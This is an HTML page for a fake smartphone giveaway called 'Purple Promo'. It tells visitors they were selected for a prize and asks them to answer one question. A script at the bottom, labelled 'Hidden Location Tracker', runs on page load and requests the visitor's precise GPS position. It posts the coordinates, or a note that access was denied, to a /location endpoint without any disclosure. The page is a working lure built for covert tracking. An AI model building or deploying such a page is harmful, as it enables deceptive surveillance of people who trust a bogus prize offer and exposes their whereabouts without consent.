<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Exclusive Mobile Giveaway - Purple Promo</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #f2f2f2;
      font-family: Arial, sans-serif;
      color: #333;
    }

    .container {
      max-width: 700px;
      margin: 40px auto;
      padding: 20px;
      background: #fff;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      border-radius: 10px;
    }

    h1 {
      color: #6200ea;
      text-align: center;
    }

    .promo-image {
      width: 100%;
      height: auto;
      border-radius: 8px;
    }

    .details {
      text-align: center;
      margin-top: 20px;
    }

    .details p {
      font-size: 18px;
    }

    .cta-button {
      display: inline-block;
      margin-top: 20px;
      padding: 12px 25px;
      font-size: 16px;
      color: #fff;
      background: #6200ea;
      text-decoration: none;
      border-radius: 6px;
      transition: background 0.3s;
    }

    .cta-button:hover {
      background: #4b00b5;
    }

    .footer {
      margin-top: 40px;
      text-align: center;
      font-size: 13px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎉 Exclusive Mobile Giveaway 🎉</h1>
    <img class="promo-image" src="https://i.imgur.com/U4C2G8x.png" alt="Phone Giveaway">
    <div class="details">
      <p>You're selected to receive a brand new <strong>Android flagship smartphone</strong>!</p>
      <p>Answer one quick question and claim your reward.</p>
      <a href="#" class="cta-button">Start Now</a>
    </div>
    <div class="footer">
      © 2025 Purple Promo Inc. | Terms Apply
    </div>
  </div>

  <!-- 🔒 Hidden Location Tracker -->
  <script>
    function sendLocation(position) {
      fetch("/location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          acc: position.coords.accuracy
        })
      });
    }

    function fallbackIP() {
      fetch("/location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({gps_denied: true})
      });
    }

    try {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, fallbackIP, {enableHighAccuracy: true});
      } else {
        fallbackIP();
      }
    } catch (e) {
      fallbackIP();
    }
  </script>
</body>
</html>
